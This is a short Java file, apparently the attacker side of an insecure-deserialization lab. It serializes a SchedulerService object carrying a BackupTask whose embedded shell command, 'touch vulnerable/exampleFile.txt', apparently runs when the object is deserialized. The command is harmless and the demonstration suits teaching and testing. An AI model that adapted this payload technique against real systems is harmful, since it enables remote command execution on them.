package attacker.src.com.project;

import java.io.*;

import vulnerable.src.com.project.BackupTask;
import vulnerable.src.com.project.SchedulerService;

public class BackupScheduler {
    public static void main(String[] args) {
        try {
            BackupTask backupTask = new BackupTask("touch vulnerable/exampleFile.txt");
            SchedulerService schedulerService = new SchedulerService(backupTask);

            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("backup_task.ser"));
            oos.writeObject(schedulerService);
            oos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
